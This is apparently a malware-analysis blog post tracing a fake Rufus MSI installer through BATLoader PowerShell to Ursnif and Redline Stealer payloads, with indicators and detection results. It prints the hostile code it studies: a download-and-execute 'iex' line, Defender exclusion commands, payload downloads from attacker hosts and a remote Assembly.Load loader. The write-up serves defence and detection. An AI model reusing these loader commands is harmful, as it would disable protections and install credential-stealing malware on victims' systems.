---
layout: post
title: "BATLoader, Ursnif, and Redline, oh my!"
date: 2023-01-23
categories: malware
tags: malware batloader msi ursnif redline gpg powershell msitools msidump
permalink: /batloader-ursnif-redline-oh-my/
---

Earlier today, [@MalwareHunterTeam](https://twitter.com/malwrhunterteam) posted on Twitter about a malicious MSI file masquerading as a Rufus installer.

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Searching for &quot;rufus&quot; in Google right now gives 2 ads that are obviously not the official Rufus.<br>2nd one redirect: https://rufus-download[.]software/download-index1.html<br>Download: https://extremebot[.]software/Rufus_3.21.msi<br>Same gang: <a href="https://t.co/6spGIxTwbM">https://t.co/6spGIxTwbM</a><br>cc <a href="https://twitter.com/1ZRR4H?ref_src=twsrc%5Etfw">@1ZRR4H</a> <a href="https://twitter.com/wdormann?ref_src=twsrc%5Etfw">@wdormann</a> <a href="https://t.co/K02Vs2Q50Z">pic.twitter.com/K02Vs2Q50Z</a></p>&mdash; MalwareHunterTeam (@malwrhunterteam) <a href="https://twitter.com/malwrhunterteam/status/1617608510279405569?ref_src=twsrc%5Etfw">January 23, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

I thought it sounded interesting so I gave analysis a try on the MSI file. If you want to follow along at home, the MSI sample is here: [https://bazaar.abuse.ch/sample/41eb889a36b3dbe09fe700cedaff17317a451b3b1038fdd54103491bb882fcb7/](https://bazaar.abuse.ch/sample/41eb889a36b3dbe09fe700cedaff17317a451b3b1038fdd54103491bb882fcb7/).

## MSI Triage and Unpacking

Our first few steps on the MSI file are easy. We can verify the file is a MSI using `file` and we can unpack the MSI content using `msidump`.

```console
remnux@remnux:~/cases/rufus$ file rufus.msi 
rufus.msi: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, MSI Installer, Code page: 932, Title: Installation Database, Subject: Rufus, Author: Rufus Company, Keywords: Installer, MSI, Database, Comments: CXg[f[^x[X Rufus CXg[KvWbNf[^B, Create Time/Date: Fri Dec 11 11:47:46 2009, Name of Creating Application: Advanced Installer 17.1.2 build 64c1c160, Security: 0, Template: ;1033, Last Saved By: ;1041, Revision Number: {708B6830-05FC-48E1-8E9F-E648707AE954}3.21;{708B6830-05FC-48E1-8E9F-E648707AE954}3.21;{EA9EC272-22B1-45F2-901B-2713DE6F459B}, Number of Pages: 200, Number of Characters: 63
```

The `file` command confirms we do indeed have a MSI file, and the properties of the MSI indicate it was created using [Advanced Installer](https://www.advancedinstaller.com/). We can corroborate this data by keeping an eye on what binary file streams get extracted from the MSI.

```console
remnux@remnux:~/cases/rufus$ msidump -s -t -S rufus.msi 
Exporting table _SummaryInformation...
Exporting table _ForceCodepage...
Exporting table AdminExecuteSequence...
Exporting table Condition...
Exporting table AdvtExecuteSequence...
...
Exporting table Directory...
Exporting table CustomAction...
...
Exporting stream Binary.aicustact.dll...
Exporting stream Binary.cmdlinkarrow...
Exporting stream Binary.SoftwareDetector.dll...
Exporting stream Binary.PowerShellScriptLauncher.dll...
...
```

The `Binary.aicustact.dll` and `Binary.PowerShellScriptLauncher.dll` files are commonly seen with Advanced Installer MSI packages, and they even carry the proper Advanced Installer signature.

```console
remnux@remnux:~/cases/rufus$ pedump --security Binary/Binary.aicustact.dll

=== SECURITY ===

...

Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            79:7d:59:66:04:91:55:be:bf:38:3f:fb:0b:e3:29:10
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=US, O=thawte, Inc., CN=thawte SHA256 Code Signing CA
        Validity
            Not Before: Mar  6 00:00:00 2020 GMT
            Not After : Mar  5 23:59:59 2023 GMT
        Subject: C=RO, ST=Dolj, L=Craiova, O=Caphyon SRL, OU=SECURE APPLICATION DEVELOPMENT, CN=Caphyon SRL
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
...
```

Since `Binary.PowerShellScriptLauncher.dll` is in here, there's a decent chance that our MSI CustomAction table has some PowerShell code within. Let's go take a look!

## MSI CustomAction and PowerShell

Looking into the dumped CustomAction table, we can see some potentially malicious code.

```powershell
...

sleep -Milliseconds 241
[\[]Net.ServicePointManager[\]]::SecurityProtocol = [\[]Net.SecurityProtocolType[\]]::Tls12
(new-object Net.WebClient).DownloadString("hxxps://aimp[.]software/rufus.gpg") | iex

...

```
{: file='CustomAction.idt'}

This chunk of code downloads additional PowerShell code and executes it using PowerShell's Invoke-Expression cmdlet. The additional code is obfuscated and fairly long. I've cut down the base64 a lot here because we'll go over the decoded version in pieces as we go. For the decoded script, I'll refer to that filename as `rufus.decoded.ps1`.

```powershell
powershell.exe -exec bypass -enc DQAKAHMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAAxADIAMwA1AA0ACgAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBl ... AKQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcADQAKAEMAbABlAGEAcgAtAEgAaQBzAHQAbwByAHkAIAANAAoADQAKAA==
```
{: file='rufus.gpg'}

After decoding the base64 command with CyberChef we can examine the PowerShell code executed in multiple parts. First, the script calls home to command and control before configuring Windows Defender exclusions.

```powershell
sleep -Milliseconds 1235
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri ("hxxps://advertising-check[.]ru/start.php") -UseBasicParsing
$ErrorActionPreference = 'Continue'

Add-MpPrefer`ence -ExclusionExtension ".dll", ".cmd", ".bat", ".zip", ".exe"
Add-MpPrefer`ence -ExclusionPath "C:\Windows\System32\drivers\etc", "C:\Windows\System32\Config", "$env:APPDATA"
Add-MpPrefer`ence -ExclusionProcess "Zeip.dll", "Zeip.exe"
...
```
{: file='rufus.decoded.ps1'}

The Windows Defender exclusions include files with the extensions DLL, CMD, BAT, ZIP, and EXE. The paths include C:\Windows\System32\drivers\etc, C:\Windows\System32\Config, and the current user's AppData\Roaming folder. Finally, it adds process exclusions specifically for Zeip.dll and Zeip.exe. This detail is going to be useful as the files get downloaded later in the script.

```powershell
...
$ErrorActionPreference = 'Stop'
Invoke-WebRe`quest -Uri ("hxxps://bitbucket[.]org/assop/test/downloads/Zeip.dll.gpg") -OutFile $env:APPDATA\Zeip.dll.gpg
Invoke-WebRe`quest -Uri ("hxxps://bitbucket[.]org/assop/test/downloads/Zeip.exe.gpg") -OutFile $env:APPDATA\Zeip.exe.gpg
$ErrorActionPreference = 'Continue'
...
```
{: file='rufus.decoded.ps1'}

Both Zeip.dll and Zeip.exe are downloaded, but they're not in executable form yet. If we examine their file type, it looks like they're both GPG encrypted with AES256. 

```console
remnux@remnux:~/cases/rufus$ file Zeip.exe.gpg 
Zeip.exe.gpg: GPG symmetrically encrypted data (AES256 cipher)
```

Presumably, the files must be decrypted before they can execute. That portion comes much later in the script, so we'll keep going until we get to it.

```powershell
...
sleep -Milliseconds 245
Invoke-Web`Request -Uri hxxps://raw.githubusercontent[.]com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $env:APPDATA\NSudo.exe
sleep -Milliseconds 245

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("hxxps://github[.]com/pbatard/rufus/releases/download/v3.21/rufus-3.21.exe", "$env:APPDATA\setup.exe")

.$env:APPDATA\setup.exe

...
```
{: file='rufus.decoded.ps1'}

This chunk of code does two things. After a sleep delay, it downloads NSudo and the legitimate Rufus installer before installing Rufus. The NSudo executable is often used by [BATLoader](https://malpedia.caad.fkie.fraunhofer.de/details/win.bat_loader)/Zloader to execute commands with escalated privileges and break up process execution trees. The legitimate Rufus installer is likely to complete the Rufus installation ruse. The malware authors don't want the victim to get suspicious because Rufus wasn't installed as requested.

```powershell
...
function Install-GnuPg {

  [CmdletBinding()]

  param
  (

    [Parameter(Mandatory)]
    [ValidateNotNullOrEmpty()]
    [string]$DownloadFolderPath,
    [Parameter()]
    [ValidateNotNullOrEmpty()]
       
    [string]$DownloadUrl = 'hxxp://files.gpg4win[.]org/gpg4win-2.2.5.exe'
    )
...
```
{: file='rufus.decoded.ps1'}

The actual code to implement GPG functionality starts at this point in the script. It looks like the script implements the `Install-GnuPg`, `Add-Encryption`, and `Remove-Encryption` cmdlets. From some cursory Googling, it looks like these functions are ripped straight from someone's Github repository: <https://github.com/adbertram/Random-PowerShell-Work/blob/master/Security/GnuPg.psm1>

Finally we can get into the decryption part of the script. 

```powershell
...
Install-GnuPG -DownloadFolderPath $env:APPDATA

Remove-Encryption -FolderPath $env:APPDATA -Password 'putingod'
...
```
{: file='rufus.decoded.ps1'}

The `Remove-Encryption` command removes GPG encryption from any of the files in AppData\Roaming using the passphrase `putingod`. This results in the decrypted Zeip.exe and Zeip.dll before execution using Nsudo, PowerShell, and rundll32.exe.

```powershell
...
.$env:APPDATA\Nsudo.exe -U:P -ShowWindowMode:Hide cmd /c powershell.exe -command "rundll32 $env:APPDATA\Zeip.dll, DllRegisterServer; $env:APPDATA\Zeip.exe"
...
```
{: file='rufus.decoded.ps1'}

The combination of Nsudo and GPG/PGP encryption in payloads is really [unique to BATLoader](https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html) and helps us attribute the activity back to that threat.

## Decrypting Zeip.dll and Zeip.exe ourselves

If you're working with a REMnux VM, decrypting the files is really easy:

```console
remnux@remnux:~/cases/rufus$ gpg --decrypt --output Zeip.exe Zeip.exe.gpg 
gpg: AES256 encrypted data
gpg: encrypted with 1 passphrase

remnux@remnux:~/cases/rufus$ gpg --decrypt --output Zeip.dll Zeip.dll.gpg 
gpg: AES256 encrypted data
gpg: encrypted with 1 passphrase
```

If you're working with a Windows VM, you'll likely need to install the same GPG tools the adversary used for decryption in their script. 

## Analyzing Zeip.dll

Zeip.dll is definitely a DLL file likely made using C/C++ according to `diec`.

```console
remnux@remnux:~/cases/rufus$ diec Zeip.dll
PE32
    Linker: Microsoft Linker(9.9, Visual Studio 2008 9.0*)[DLL32]

remnux@remnux:~/cases/rufus$ pehash Zeip.dll
file
    filepath:   Zeip.dll
    md5:        85fa54c2a97ad3a1f8bd64af62450511
    sha1:       db92c0a81e8b27d222607e093ccc9d00485db119
    sha256:     e609894b274a6c42e971e8082af8fd167ade4aef5d1a3816d5acea04839f0b35
    ssdeep:     12288:cysmuJC4fktsdyjJGL44Clz8JwsWydYo9NRl:cT7IoyjXTKdlnz
    imphash:    78b4b07ec49eab1076c53a1a1cf86078
```

After looking at the hash values, I learned that the DLL is already in [MalwareBazaar](https://bazaar.abuse.ch/sample/e609894b274a6c42e971e8082af8fd167ade4aef5d1a3816d5acea04839f0b35/) and most of the sandbox reports linked agree on the DLL belonging to the [Ursnif/Gozi/ISFB malware family](https://malpedia.caad.fkie.fraunhofer.de/details/win.gozi). [CAPE](https://www.capesandbox.com/analysis/356147/), [Tria.ge](https://tria.ge/230123-1tw69shc6x/behavioral2), [Joe Sandbox](https://www.joesandbox.com/analysis/790195/0/html), and [VMRay Analyzer](https://www.vmray.com/analyses/_vt/e609894b274a/report/overview.html) all agree that structures in memory during execution match Ursnif YARA rule matches and they even extract the configuration successfully in the reports. Joe Sandbox produced this configuration extraction:

```json
{
  "RSA Public Key": "nEv1xgiiSSEq+UsF/sH972dYWlbdaVOznM6pMFVoUS05gtglJzWNlT7nMktPHUwL6//kjiNOqc4tDzQZ19ymuBpLEGqUVvC4ejuRj/0ho+UjebbguqPlH5n0kxpUzAwMML4tOLtp9LPhNicxLWntxqAhB5vWoa98iW2MUoUphRHcd2dO72hrBAGA6DCyFxDcS8WlyxVQ7VBx1Nh+pbslLneoja8gI1kgMhn78GgHQk/qR1oUbrcP/HgzqcZ46oTj/Z8oDh7Uf+bI3Bv799doULwM1Koc6uZt/pcclNdWQSZWvlVfFozPuVvT9NaBray36Sn10KTAPhwPYdk+nFxrudJjVCtbXTj4F13byKvdsT0=",
  "c2_domain": [
    "trackingg-protectioon.cdn4.mozilla[.]net",
    "80.77.23[.]77",
    "trackingg-protectioon.cdn4.mozilla[.]net",
    "80.77.25[.]109",
    "protectioon.cdn4.mozilla[.]net",
    "170.130.165[.]182",
    "protectioon.cdn4.mozilla[.]net",
    "80.77.25[.]114"
  ],
  "botnet": "20005",
  "server": "50",
  "serpent_key": "OFX3RdYc8A5rFAaL",
  "sleep_time": "3",
  "CONF_TIMEOUT": "5",
  "SetWaitableTimer_value": "0"
}
```

In addition, ingesting the captured network traffic PCAP file into Suricata resulted in Ursnif alerts:

```console
remnux@remnux:~/cases/rufus$ sudo ~/suri-ingest-pcap.sh ursnif-dump.pcap 
24/1/2023 -- 00:23:45 - <Notice> - This is Suricata version 6.0.8 RELEASE running in USER mode

[*] Alerts:

"... | ET MALWARE Ursnif Variant CnC Beacon - URI Struct M2 (_2F) | ... 10.127.0.214:49762 -> 80.77.23.77:80"
```

Thus far, the sample seems like Ursnif!

## Analyzing Zeip.exe

```console
remnux@remnux:~/cases/rufus$ diec Zeip.exe
PE32
    Library: .NET(v4.0.30319)[-]
    Linker: Microsoft Linker(48.0)[GUI32]
```

The `diec` tool indicates that Zeip.exe is a .NET framework binary, and that doesn't seem like it would be part of the Ursnif implementation. We can try decompiling to determine its capabilities.

```console
remnux@remnux:~/cases/rufus$ ilspycmd -p -o ./Zeip-exe-src/ Zeip.exe

remnux@remnux:~/cases/rufus$ tree Zeip-exe-src/
Zeip-exe-src/
├── ajshbdvfuhjasgdvjas
│   └── GUIDLSJKLJLS.cs
├── app.ico
├── Properties
│   └── AssemblyInfo.cs
├── System\Windows
│   └── Forms.cs
├── Zeip.csproj
├── Zeip\Properties
│   ├── Resources.cs
│   └── Settings.cs
└── Zeip.Properties.Resources.resx

4 directories, 8 files
```

Once decompiled, we can see there are very few code files. The one of most interest is the `GUIDLSJKLJLS.cs` file. In that code, there is a `Main()` function for the program's entry point:

```cs
public static void Main()
{
    goalvsrussia.russiawin("hxxp://62.204.41[.]176/putingod.exe");
}
```
{: file='GUIDLSJKLJLS.cs'}

A URL gets passed into the `russiawin()` function, which performs a download of the bytes in the URL. In turn, that function calls more code that performs an `Assembly.Load()` call of the downloaded bytes. This implies the downloaded code is most likely additional .NET code. We can take a look in `putingod.exe` to determine the next stage as the rest of the code files in this executable are pretty empty.

## Analyzing putingod.exe

ILSpyCMD didn't give me good readable results for this sample, so I had to jump into a FLARE VM and use DNSpy instead. Usually when one doesn't work for me, the other will. In the initial properties shown by DNSpy, we can see the entry point for the program is under `System.Program`. 

```cs
// C:\Users\User\Documents\cases\rufus\putingod.exe
// Sairs, Version=312.23.2.0, Culture=neutral, PublicKeyToken=null

// Entry point: System.Program.Main
...

[assembly: AssemblyVersion("312.23.2.0")]
[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: ComVisible(false)]
[assembly: AssemblyTitle("Nokia USB Tool")]
[assembly: AssemblyDescription("Nokia Desktop Client")]
[assembly: AssemblyCompany("Nokia")]
[assembly: AssemblyProduct("Desktop USB Manager")]
[assembly: AssemblyCopyright("Nokia Inc. 2022")]
[assembly: AssemblyFileVersion("12.2.1")]
[assembly: TargetFramework(".NETFramework,Version=v4.0", FrameworkDisplayName = ".NET Framework 4")]
[assembly: SecurityPermission(SecurityAction.RequestMinimum, SkipVerification = true)]
```

That starting point is the `Main()` function, which doesn't do much besides call another function to start doing work.

```cs
private static void Main(string[] args)
{
    Program.ReadLine();
}

public static void ReadLine()
{
    try
    {
        AuтhАрi auтhАрi = new AuтhАрi();
        bool flag = false;
        while (!flag)
        {
            foreach (string address in StringDecrypt.Read(Arguments.IP, Arguments.Key).Split(new char[]
            {
                '|'
            }))
```
{: file='Program.cs'}

Eagle-eyed readers probably took notice of the `Arguments.IP` and `Arguments.Key` items. We can potentially infer that the contents of that `Arguments` class may contain configuration info. Let's take a gander.

```cs
public static class Arguments
{
	public static string IP = "GwQ5FC4BJFQZBCEZLwEgVxs6H1EtLyxXGD9NXA==";
	public static string ID = "AQMmUjc8M1QMP01c";
	public static string Message = "";
	public static string Key = "Unpacked";
}
```

Sure enough, that looks like a configuration block. Some folks in the crowd may recognize this as a configuration structure for [Redline Stealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer), which we can test pretty easily given the malware's [well-documented C2 extraction method](https://cloudsek.com/technical-analysis-of-the-redline-stealer/). We can un-base64 the IP field, XOR the resultant value with the Key field, and then un-base64 again to reveal a C2 address if this is Redline.

![CyberChef Redline Config Decoding](/assets/images/batloader-ursnif-redline-oh-my/cyberchef-redline-decoding.png)

Sure enough, there appears to be a valid C2 address for `62.204.41[.]175:44271`. We can validate our findings in a couple ways. First, we can use YARA rules. The `putingod.exe` binary matches YARA rules for Redline from the [Ditekshen YARA repository](https://github.com/ditekshen/detection).

```console
remnux@remnux:~/cases/rufus$ yara -s malware.yar putingod.exe 
MALWARE_Win_RedLine putingod.exe
0x15ff8:$pat14: ,\x00 \x00C\x00o\x00m\x00m\x00a\x00n\x00d\x00L\x00i\x00n\x00e\x00:\x00
0x114f1:$v2_1: ListOfProcesses
0x112ee:$v4_3: base64str
0x11c91:$v4_4: stringKey
0xfef6:$v4_5: BytesToStringConverted
0xede9:$v4_6: FromBase64
0x1035a:$v4_8: procName
0xfded:$v5_9: BCRYPT_KEY_LENGTHS_STRUCT
```

In addition, we can use Suricata rules on PCAP data exported from [Tria.ge](https://tria.ge/230123-vs48laec99/behavioral2), which again indicates Redline activity.

```console
remnux@remnux:~/cases/rufus$ sudo ~/suri-ingest-pcap.sh redline-dump.pcap 
24/1/2023 -- 01:00:44 - <Notice> - This is Suricata version 6.0.8 RELEASE running in USER mode

[*] Alerts:

"... | ET MALWARE RedLine Stealer TCP CnC net.tcp Init | ... 10.127.0.10:49744 -> 62.204.41.175:44271"
"... | ET MALWARE Redline Stealer TCP CnC Activity | ... 10.127.0.10:49744 -> 62.204.41.175:44271"
"... | ET MALWARE Redline Stealer TCP CnC - Id1Response | ... 62.204.41.175:44271 -> 10.127.0.10:49744"
"... | ET MALWARE Redline Stealer TCP CnC Activity | ... 10.127.0.10:49744 -> 62.204.41.175:44271"
```

So I'm pretty confident we've successfully identified Redline alongside BATLoader and Ursnif! This is the end of the trail for this sample unless you want to further pull apart Ursnif to identify more details. That will be a bit more difficult than the Redline sample, so I opted not to do so tonight. Thanks for reading!
